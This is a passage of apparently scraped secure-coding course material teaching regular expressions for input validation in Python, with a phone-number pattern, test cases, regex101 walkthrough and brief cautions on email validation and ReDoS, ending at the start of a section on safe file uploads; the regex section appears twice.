Next, we are searching for any digit (<em>\d</em>) repeated eight times
(<em>{8}</em>) before we reach the end of the line (<em>$</em>). In summary, we
would have the three-digit country code (defined previously), followed
by nine more digits to result in a 12-digit cell phone number.</p>
<p>Now let's focus on landlines. We will use the regexp
<em>([^908\D]\d{7}$)</em>. Let's analyze this. Landlines can't start with 0,
8 or 9, so we will match a single character with a negation class
(<em>[^908]</em>) that excludes these digits. Since this is the format of a
negation class, the <em>^</em> character in this context does not signify the
beginning of the line. Continuing on, since we also don't want to
match any non-numeric characters, we'll include <em>\D</em> in this class to
exclude non-numeric characters. In summary, this class (<em>[^908\D]</em>)
searches for any single number that is not 0, 8, or 9. Next, we include
<em>\d</em>, which includes any digit, repeated exactly seven times (<em>{7}</em>)
until we reach the end of the line, <em>$</em>.</p>
<p>Now that we've created patterns for both landlines and cell phones, we
can replace them in our original regular expression. The final
expression is as follows:</p>
<pre id="fence-code-64" class="fence-code"><code>^\+593(([98]\d{8}$)|([^908\D]\d{7}$))
</code></pre>
<blockquote>
<p>Listing 32 - Phone number format for landlines and cell phones</p>
</blockquote>
<p>Let's define some test cases to analyze if the regular expression is
working correctly.</p>
<ul>
<li>+59342243048 is a landline; it should match.</li>
<li>+59392659874 is not valid. It has the length of a landline, but a 9 after the country code, which is only valid for cell phones.</li>
<li>+593968548487 is a valid cell phone; it should match.</li>
<li>+593459878456 is not valid. It has the length of a cell phone, but has a 4 instead of 9 or 8 after the country code.</li>
<li>+593a5987845 is not valid because it has an alphabetic character.</li>
</ul>
<p>Let's test these using the Python <em>re.match()</em> function. The function
returns a <em>re.Match</em> object if the string matches the regular
expression, but doesn't return anything if the string does not match.</p>
<pre id="fence-code-65" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">python3</span>
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; <span class="code-block-ui">import re</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+59342243048")</span>
<span class="code-block-s">&lt;re.Match object; span=(0, 12), match='+59342243048'&gt;</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+59392659874")</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+593968548487")</span>
<span class="code-block-s">&lt;re.Match object; span=(0, 13), match='+593968548487'&gt;</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+593459878456")</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+593a5987845")</span>
</code></pre>
<blockquote>
<p>Listing 33 - Execution of test cases to verify the regular expression.</p>
</blockquote>
<p>Every output matches our expectations, so our pattern worked.</p>
<p>There's another tool we can use to verify if our regular expression is
working correctly. First, let's browse to <strong>https://regex101.com/</strong>.
The website contains many panels. We are going to focus on <em>Regular
Expression</em> and <em>Test String</em> first.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/e03a6f6a0081b0bdcd40a8d9cb55d4fa-iv_regex101_1.png" alt="Figure 5: Regex101">
<figcaption>Figure 5: Regex101</figcaption>
</figure>
<p></p>
<p>Let's paste the regular expression we defined in Listing
32 in the <em>Regular Expression</em> section. We'll
also paste all our test cases in the <em>Test String</em> section.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/c9c0f1baf542b7d14ba4ba391a2ad0fe-iv_regex101_2.png" alt="Figure 6: Adding our regex and our test cases">
<figcaption>Figure 6: Adding our regex and our test cases</figcaption>
</figure>
<p></p>
<p>We'll observe that both our regular expression and our test strings
are highlighted. In the case of the regular expression, it is color
coded because the <em>Explanation</em> panel will have corresponding colors
to describe its functionality. Regarding our test strings, not all of
them are highlighted; this means that not all of them matched.</p>
<p>As we already verified using Python, only the values "+59342243048"
and "+593968548487" matched. The colors that the <em>Test String</em> panel
uses to highlight matching values are used to coordinate them to
groups or sections of the regular expressions that they adhere to.
We'll notice the same colors in the <em>Match Information</em> panel.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/0cc5a2d56ccf863b0eafbeac2402339a-iv_regex101_3.png" alt="Figure 7: Verifying our test cases with Regex101">
<figcaption>Figure 7: Verifying our test cases with Regex101</figcaption>
</figure>
<p></p>
<p>The <em>Explanation</em> panel is also very useful. It provides a detailed
breakdown of each part of our regex and assigns numbers to sections
such as groups. These numbers are used as identifiers by the <em>Match
Information</em> panel so that it's easier to identify why a particular
string matches our regex.</p>
<p>Creating regular expressions can be a time-consuming process, mostly
because of edge cases that might not seem apparent at first. However,
we don't have to create them every time. There are common patterns
such as zip codes<sup class="footnote-ref"><a href="#fn12" id="fnref12">12</a></sup> that have public implementations
available online.</p>
<p>Besides edge cases, the assumptions and rules we want to translate
into regular expressions need to be clearly defined. A common
validation that ends up being wrong because of incorrect assumptions
is the validation of email addresses.</p>
<p>It is common for email validators to have incorrect assumptions such
as only allowing common <em>top-level domains</em><sup class="footnote-ref"><a href="#fn13" id="fnref13">13</a></sup> such as .com,
.net, and country-specific ones, disregarding newer domains such as
.io, .lawyer, .ninja, which are all valid as well. Another common
mistake is disallowing the character +, which is used to create email
aliases in services such as Gmail.</p>
<p>We need to be careful when we craft regular expressions because in
some cases, we could inadvertently define <em>Evil
Regexes</em>,<sup class="footnote-ref"><a href="#fn14" id="fnref14">14</a></sup> which are scenarios caused by quantifiers
that create very large numbers of possible matches with
specially-crafted inputs. An attacker could exploit this to cause a
<em>regular expression denial-of-service</em> (ReDoS).<sup class="footnote-ref"><a href="#fn14" id="fnref14:1">14:1</a></sup></p>
<p>To summarize, regular expressions provide a way to verify if our
input follows a format. Some example formats are phone numbers, zip
codes, and email addresses. Regular Expression syntax might appear
intimidating at first, but as long as we define our test cases to
verify if they are correct, we'll be able to use them without issues.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(The Open Group, 1997), <a href="http://www-stat.wharton.upenn.edu/~buja/STAT-540/Regular-Expressions-man-page.htm" target="_blank">http://www-stat.wharton.upenn.edu/~buja/STAT-540/Regular-Expressions-man-page.htm</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(Free Software Foundation Inc., 2023), <a href="https://www.gnu.org/software/grep/manual/grep.html" target="_blank">https://www.gnu.org/software/grep/manual/grep.html</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(The Open Group Base Specifications, 2018), <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html" target="_blank">https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(Perl, 2002), <a href="https://www.perl.org/" target="_blank">https://www.perl.org/</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(PCRE, 1997), <a href="https://www.pcre.org/" target="_blank">https://www.pcre.org/</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn6"><sup>6</sup><p>(IBM, 2021), <a href="https://www.ibm.com/docs/en/rational-clearquest/9.0.1?topic=tags-meta-characters-in-regular-expressions" target="_blank">https://www.ibm.com/docs/en/rational-clearquest/9.0.1?topic=tags-meta-characters-in-regular-expressions</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn7"><sup>7</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Escape_sequence" target="_blank">https://en.wikipedia.org/wiki/Escape_sequence</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn8"><sup>8</sup><p>(Python, 2023), <a href="https://docs.python.org/3/library/re.html" target="_blank">https://docs.python.org/3/library/re.html</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn9"><sup>9</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/python/python_regex.asp#sub" target="_blank">https://www.w3schools.com/python/python_regex.asp#sub</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn10"><sup>10</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/List_of_mobile_telephone_prefixes_by_country" target="_blank">https://en.wikipedia.org/wiki/List_of_mobile_telephone_prefixes_by_country</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn11"><sup>11</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Divide-and-conquer_algorithm" target="_blank">https://en.wikipedia.org/wiki/Divide-and-conquer_algorithm</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn12"><sup>12</sup><p>(O’Reilly Media, Inc, 2023), <a href="https://www.oreilly.com/library/view/regular-expressions-cookbook/9781449327453/ch04s14.html" target="_blank">https://www.oreilly.com/library/view/regular-expressions-cookbook/9781449327453/ch04s14.html</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn13"><sup>13</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Top-level_domain" target="_blank">https://en.wikipedia.org/wiki/Top-level_domain</a> <a href="#fnref13" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn14"><sup>14</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a> <a href="#fnref14" class="footnote-backref">↩︎</a> <a href="#fnref14:1" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>Crafting Regular Expressions</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p><em>Regular Expressions (regex)</em><sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> are another approach we
can follow when we want to validate input. Regular expressions are
character sequences that contain a format with a particular meaning
that allows a parser to verify if a string matches the format that the
regex encompasses. The main use cases for regular expressions include
searching for values, replacing values inside strings, and input
validation.</p>
<p>Many programming languages and tools (such as <em>grep</em>)<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup>
support different syntaxes and standards of regular expressions. The
IEEE POSIX standard<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup> has three syntax variations: <em>Basic
Regular Expressions</em>, <em>Extended Regular Expressions</em>, and the
discontinued <em>Simple Regular Expressions</em>.</p>
<p>It is important to note, however, that <em>Perl's</em><sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup>
implementation of regular expressions has become the preferred
syntax, and is considered the de-facto standard. Eventually,
a re-implementation was created, which is referred to as <em>Perl
Compatible Regular Expressions</em> (PCRE)<sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> and used in many
programming languages. This is the syntax that we are going to
explore.</p>
<p>There are a few concepts that we need to understand before we
continue:</p>
<ul>
<li>
<p><em>Meta characters</em><sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup> are characters that have a
particular meaning when used as part of a regex. This means that if
we want to evaluate them as a literal value, we need to
<em>escape</em><sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> them with a backslash (<strong>\</strong>).</p>
</li>
<li>
<p><em>Groups</em> are sections of our regex enclosed in parentheses. Their
main function is to work as a sub-pattern inside a larger regular
expression. They are particularly useful when we want to specify
precedence. In cases where we have many groups, they are processed
from the inside out (hence the precedence). They are also useful
when we want to make logical decisions such as <em>not</em> and <em>or</em>.</p>
</li>
<li>
<p><em>Quantifiers</em> are auxiliary sequences that help us define if a group
or a character needs to be repeated and how many times.</p>
</li>
<li>
<p><em>Classes</em> enclose a group of characters that will be part of our
search. Any of the characters present in a class will be considered
a match if present in the fragment of the string we are searching
for. To define a class, we use square brackets (<strong>[]</strong>). As an example,
the class <em>[ae]</em> will match either a or e.</p>
</li>
<li>
<p><em>Lazy</em> means that the regular expression will stop searching when it
first finds an instance of a value that satisfies the search term.</p>
</li>
<li>
<p><em>Greedy</em> means that the regular expression will keep searching until
the last instance of the value that satisfies the search term.</p>
</li>
</ul>
<p>The following table contains common patterns that we can use to create
regular expressions.</p>
<table>
<thead>
<tr>
<th>Pattern</th>
<th>Classification</th>
<th>Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>a b c 1 2 3</td>
<td>Character</td>
<td>Literal alphanumeric characters that are not meta characters, and are written as-is</td>
</tr>
<tr>
<td>.</td>
<td>Meta character</td>
<td>Match any single character except new line</td>
</tr>
<tr>
<td>^ $</td>
<td>Meta character</td>
<td>These characters are called anchors. They don't represent a value, but a position inside the string. They represent the beginning and the end of a line, respectively.</td>
</tr>
<tr>
<td>|</td>
<td>Meta character</td>
<td>It's the equivalent of a logical "or"</td>
</tr>
<tr>
<td>(x|y|z)</td>
<td>Group</td>
<td>Match either x, y, or z</td>
</tr>
<tr>
<td>[xyz]</td>
<td>Class</td>
<td>Match either x, y, or z</td>
</tr>
<tr>
<td>[^xyz]</td>
<td>Class</td>
<td>Match anything but x, y, or z</td>
</tr>
<tr>
<td>[b-g]</td>
<td>Class</td>
<td>Match any character in the range of b-g in the alphabet</td>
</tr>
<tr>
<td>\s</td>
<td>Class</td>
<td>Match a space, it's the equivalent of [ ]</td>
</tr>
<tr>
<td>\S</td>
<td>Class</td>
<td>Match any character that is not a space, it's the equivalent of   [^ ]</td>
</tr>
<tr>
<td>\d</td>
<td>Class</td>
<td>Match any digit, it's the equivalent of [0-9]</td>
</tr>
<tr>
<td>\D</td>
<td>Class</td>
<td>Match any character that is not a digit, it's the equivalent of [^0-9]</td>
</tr>
<tr>
<td>\w</td>
<td>Class</td>
<td>Match any alphanumeric character and underscores, it's the equivalent of [a-zA-Z0-9_]</td>
</tr>
<tr>
<td>\W</td>
<td>Class</td>
<td>Match any non-alphanumeric character and underscores, it's the equivalent of [^a-zA-Z0-9_]</td>
</tr>
<tr>
<td>*</td>
<td>Meta character / Quantifier</td>
<td>Match 0 or more of the preceding character</td>
</tr>
<tr>
<td>\+</td>
<td>Meta character / Quantifier</td>
<td>Match 1 or more of the preceding character</td>
</tr>
<tr>
<td>?</td>
<td>Meta character / Quantifier</td>
<td>Match 0 or 1 of the preceding character</td>
</tr>
<tr>
<td>{n}</td>
<td>Quantifier</td>
<td>Match the preceding character or group exactly n times</td>
</tr>
<tr>
<td>{n,}</td>
<td>Quantifier</td>
<td>Match the preceding character or group at least n times in a greedy fashion</td>
</tr>
<tr>
<td>{n,}?</td>
<td>Quantifier</td>
<td>Match the preceding character or group at least n times in a lazy fashion</td>
</tr>
<tr>
<td>{n,m}</td>
<td>Quantifier</td>
<td>Match the preceding character or group between n and m times in a greedy fashion</td>
</tr>
<tr>
<td>{n,m}?</td>
<td>Quantifier</td>
<td>Match the preceding character or group between n and m times in a lazy fashion</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Table 2 - Regular expression patterns</p>
</blockquote>
<p>Using Table 2 as a reference, let's create some
format validations. We should note that when working with regular
expressions, there are many ways to achieve the same result. As long
as we understand the patterns we are using, we might have different
regular expressions that work in the same way.</p>
<p>Let's start with a regular expression that does not require too many
patterns. We'll find the words "burger" and "sandwich", and if they
are found as part of a string, we will replace them with the word
"cake".</p>
<p>To follow along, let's start our VM in the <em>Resources</em> section.</p>
<p>To use regular expressions in Python, we need to import the
<em>re</em><sup class="footnote-ref"><a href="#fn8" id="fnref8">8</a></sup> module.</p>
<pre id="fence-code-61" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">python3</span>
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; <span class="code-block-ui">import re</span>
</code></pre>
<blockquote>
<p>Listing 29 - Importing the Python regex library</p>
</blockquote>
<p>Next, we'll use the <em>re.sub()</em><sup class="footnote-ref"><a href="#fn9" id="fnref9">9</a></sup> function, which
accepts three parameters: a regular expression to use for the search,
the value that will replace the instances of the results of the
search, and the target string. In this case, we will use the regular
expression <em>burger|sandwich</em>, in which the | indicates that either
string is a valid match.</p>
<pre id="fence-code-62" class="fence-code has-commands"><code>&gt;&gt;&gt; <span class="code-block-ui">re.sub("burger|sandwich","cake","Cheeseburgers are more than just a sandwich, they are a wish fulfilled.")</span>
<span class="code-block-p">'Cheesecakes are more than just a cake, they are a wish fulfilled.'</span>
</code></pre>
<blockquote>
<p>Listing 30 - Python regex for string replacement</p>
</blockquote>
<p>The substitution took place and the function returned a new string.</p>
<p>Let's continue with another example. We'll define the conditions for a
phone number<sup class="footnote-ref"><a href="#fn10" id="fnref10">10</a></sup> format, and then create the regular
expression for it step by step.</p>
<p>We will describe a phone number format beginning with a country code
of "+593", but we want to capture both cell phones and landlines, which
differ in format.</p>
<ul>
<li>
<p>Cell phones have 12 digits after the <em>+</em> sign.</p>
</li>
<li>
<p>Landlines have 11 digits after the <em>+</em> sign.</p>
</li>
<li>
<p>Cell phones can only have 9 or 8 after the country code.</p>
</li>
<li>
<p>Landlines can't have 0, 9, or 8 after the country code.</p>
</li>
</ul>
<p>To create this regular expression, we'll use a
<em>divide-and-conquer</em><sup class="footnote-ref"><a href="#fn11" id="fnref11">11</a></sup> approach. Let's break the
problem into small chunks and then we'll assemble the final pattern.</p>
<p>The phone number always needs to start with <em>+593</em>. We'll begin with
<em>^\+593</em>, in which the meta character <em>^</em> signifies that the sequence
needs to be at the beginning of the string. The character <em>+</em> is a
meta character, which means we'll need to escape it with \, and
finally the number 593.</p>
<p>Both cell phones and landlines start with the same sequence, but the
pattern will diverge after the country code. For now, we will set up
numerical placeholder groups following the country code, separated by
a logical OR (|).</p>
<pre id="fence-code-63" class="fence-code"><code>^\+593(($)|($)) 
</code></pre>
<blockquote>
<p>Listing 31 - Partial regular expression</p>
</blockquote>
<p>Let's focus on cell phone formats first. The group that represents
cell phones could be something like <em>([98]\d{8}$)</em>. Let's break this
down. The first digit should be either 9 or 8, signified by <em>[98]</em>.
Next, we are searching for any digit (<em>\d</em>) repeated eight times
(<em>{8}</em>) before we reach the end of the line (<em>$</em>). In summary, we
would have the three-digit country code (defined previously), followed
by nine more digits to result in a 12-digit cell phone number.</p>
<p>Now let's focus on landlines. We will use the regexp
<em>([^908\D]\d{7}$)</em>. Let's analyze this. Landlines can't start with 0,
8 or 9, so we will match a single character with a negation class
(<em>[^908]</em>) that excludes these digits. Since this is the format of a
negation class, the <em>^</em> character in this context does not signify the
beginning of the line. Continuing on, since we also don't want to
match any non-numeric characters, we'll include <em>\D</em> in this class to
exclude non-numeric characters. In summary, this class (<em>[^908\D]</em>)
searches for any single number that is not 0, 8, or 9. Next, we include
<em>\d</em>, which includes any digit, repeated exactly seven times (<em>{7}</em>)
until we reach the end of the line, <em>$</em>.</p>
<p>Now that we've created patterns for both landlines and cell phones, we
can replace them in our original regular expression. The final
expression is as follows:</p>
<pre id="fence-code-64" class="fence-code"><code>^\+593(([98]\d{8}$)|([^908\D]\d{7}$))
</code></pre>
<blockquote>
<p>Listing 32 - Phone number format for landlines and cell phones</p>
</blockquote>
<p>Let's define some test cases to analyze if the regular expression is
working correctly.</p>
<ul>
<li>+59342243048 is a landline; it should match.</li>
<li>+59392659874 is not valid. It has the length of a landline, but a 9 after the country code, which is only valid for cell phones.</li>
<li>+593968548487 is a valid cell phone; it should match.</li>
<li>+593459878456 is not valid. It has the length of a cell phone, but has a 4 instead of 9 or 8 after the country code.</li>
<li>+593a5987845 is not valid because it has an alphabetic character.</li>
</ul>
<p>Let's test these using the Python <em>re.match()</em> function. The function
returns a <em>re.Match</em> object if the string matches the regular
expression, but doesn't return anything if the string does not match.</p>
<pre id="fence-code-65" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">python3</span>
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; <span class="code-block-ui">import re</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+59342243048")</span>
<span class="code-block-s">&lt;re.Match object; span=(0, 12), match='+59342243048'&gt;</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+59392659874")</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+593968548487")</span>
<span class="code-block-s">&lt;re.Match object; span=(0, 13), match='+593968548487'&gt;</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+593459878456")</span>

&gt;&gt;&gt; <span class="code-block-ui">re.match("^\+593(([98]\d{8}$)|([^908\D]\d{7}$))","+593a5987845")</span>
</code></pre>
<blockquote>
<p>Listing 33 - Execution of test cases to verify the regular expression.</p>
</blockquote>
<p>Every output matches our expectations, so our pattern worked.</p>
<p>There's another tool we can use to verify if our regular expression is
working correctly. First, let's browse to <strong>https://regex101.com/</strong>.
The website contains many panels. We are going to focus on <em>Regular
Expression</em> and <em>Test String</em> first.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/e03a6f6a0081b0bdcd40a8d9cb55d4fa-iv_regex101_1.png" alt="Figure 5: Regex101">
<figcaption>Figure 5: Regex101</figcaption>
</figure>
<p></p>
<p>Let's paste the regular expression we defined in Listing
32 in the <em>Regular Expression</em> section. We'll
also paste all our test cases in the <em>Test String</em> section.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/c9c0f1baf542b7d14ba4ba391a2ad0fe-iv_regex101_2.png" alt="Figure 6: Adding our regex and our test cases">
<figcaption>Figure 6: Adding our regex and our test cases</figcaption>
</figure>
<p></p>
<p>We'll observe that both our regular expression and our test strings
are highlighted. In the case of the regular expression, it is color
coded because the <em>Explanation</em> panel will have corresponding colors
to describe its functionality. Regarding our test strings, not all of
them are highlighted; this means that not all of them matched.</p>
<p>As we already verified using Python, only the values "+59342243048"
and "+593968548487" matched. The colors that the <em>Test String</em> panel
uses to highlight matching values are used to coordinate them to
groups or sections of the regular expressions that they adhere to.
We'll notice the same colors in the <em>Match Information</em> panel.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/0cc5a2d56ccf863b0eafbeac2402339a-iv_regex101_3.png" alt="Figure 7: Verifying our test cases with Regex101">
<figcaption>Figure 7: Verifying our test cases with Regex101</figcaption>
</figure>
<p></p>
<p>The <em>Explanation</em> panel is also very useful. It provides a detailed
breakdown of each part of our regex and assigns numbers to sections
such as groups. These numbers are used as identifiers by the <em>Match
Information</em> panel so that it's easier to identify why a particular
string matches our regex.</p>
<p>Creating regular expressions can be a time-consuming process, mostly
because of edge cases that might not seem apparent at first. However,
we don't have to create them every time. There are common patterns
such as zip codes<sup class="footnote-ref"><a href="#fn12" id="fnref12">12</a></sup> that have public implementations
available online.</p>
<p>Besides edge cases, the assumptions and rules we want to translate
into regular expressions need to be clearly defined. A common
validation that ends up being wrong because of incorrect assumptions
is the validation of email addresses.</p>
<p>It is common for email validators to have incorrect assumptions such
as only allowing common <em>top-level domains</em><sup class="footnote-ref"><a href="#fn13" id="fnref13">13</a></sup> such as .com,
.net, and country-specific ones, disregarding newer domains such as
.io, .lawyer, .ninja, which are all valid as well. Another common
mistake is disallowing the character +, which is used to create email
aliases in services such as Gmail.</p>
<p>We need to be careful when we craft regular expressions because in
some cases, we could inadvertently define <em>Evil
Regexes</em>,<sup class="footnote-ref"><a href="#fn14" id="fnref14">14</a></sup> which are scenarios caused by quantifiers
that create very large numbers of possible matches with
specially-crafted inputs. An attacker could exploit this to cause a
<em>regular expression denial-of-service</em> (ReDoS).<sup class="footnote-ref"><a href="#fn14" id="fnref14:1">14:1</a></sup></p>
<p>To summarize, regular expressions provide a way to verify if our
input follows a format. Some example formats are phone numbers, zip
codes, and email addresses. Regular Expression syntax might appear
intimidating at first, but as long as we define our test cases to
verify if they are correct, we'll be able to use them without issues.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(The Open Group, 1997), <a href="http://www-stat.wharton.upenn.edu/~buja/STAT-540/Regular-Expressions-man-page.htm" target="_blank">http://www-stat.wharton.upenn.edu/~buja/STAT-540/Regular-Expressions-man-page.htm</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(Free Software Foundation Inc., 2023), <a href="https://www.gnu.org/software/grep/manual/grep.html" target="_blank">https://www.gnu.org/software/grep/manual/grep.html</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(The Open Group Base Specifications, 2018), <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html" target="_blank">https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(Perl, 2002), <a href="https://www.perl.org/" target="_blank">https://www.perl.org/</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(PCRE, 1997), <a href="https://www.pcre.org/" target="_blank">https://www.pcre.org/</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn6"><sup>6</sup><p>(IBM, 2021), <a href="https://www.ibm.com/docs/en/rational-clearquest/9.0.1?topic=tags-meta-characters-in-regular-expressions" target="_blank">https://www.ibm.com/docs/en/rational-clearquest/9.0.1?topic=tags-meta-characters-in-regular-expressions</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn7"><sup>7</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Escape_sequence" target="_blank">https://en.wikipedia.org/wiki/Escape_sequence</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn8"><sup>8</sup><p>(Python, 2023), <a href="https://docs.python.org/3/library/re.html" target="_blank">https://docs.python.org/3/library/re.html</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn9"><sup>9</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/python/python_regex.asp#sub" target="_blank">https://www.w3schools.com/python/python_regex.asp#sub</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn10"><sup>10</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/List_of_mobile_telephone_prefixes_by_country" target="_blank">https://en.wikipedia.org/wiki/List_of_mobile_telephone_prefixes_by_country</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn11"><sup>11</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Divide-and-conquer_algorithm" target="_blank">https://en.wikipedia.org/wiki/Divide-and-conquer_algorithm</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn12"><sup>12</sup><p>(O’Reilly Media, Inc, 2023), <a href="https://www.oreilly.com/library/view/regular-expressions-cookbook/9781449327453/ch04s14.html" target="_blank">https://www.oreilly.com/library/view/regular-expressions-cookbook/9781449327453/ch04s14.html</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn13"><sup>13</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Top-level_domain" target="_blank">https://en.wikipedia.org/wiki/Top-level_domain</a> <a href="#fnref13" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn14"><sup>14</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a> <a href="#fnref14" class="footnote-backref">↩︎</a> <a href="#fnref14:1" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>File Uploads</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>Files are an important way to receive information from users.
Sometimes we even need to publish them immediately after they are
uploaded. If they are not handled correctly, file uploads can provide
a pathway for attackers to gain remote code execution.</p>
<p>Let's first consider files in general. When we validate files, we
might get the false impression that we can rely on the extension to be
sure that a file is not malicious. However, that is not the case.</p>
<p>File extensions are nothing more than informational labels for
aesthetic and classification purposes. Their usage does not go beyond
defining an icon for the file or filtering in file pickers. If we
rename a file with ".docx" to ".txt", it won't lose its formatting and
become a plaintext file. The extension doesn't define the file; it's
the other way around.</p>
<p>When we handle file uploads, some of the common ways to verify if a
file is safe are verifying the file's extension and checking its <em>MIME
type</em><sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> when the file is being uploaded.</p>
<p>MIME type stands for <em>Multi-purpose Internet Mail Extensions</em>. These
are detailed labels used to identify files on the internet. For
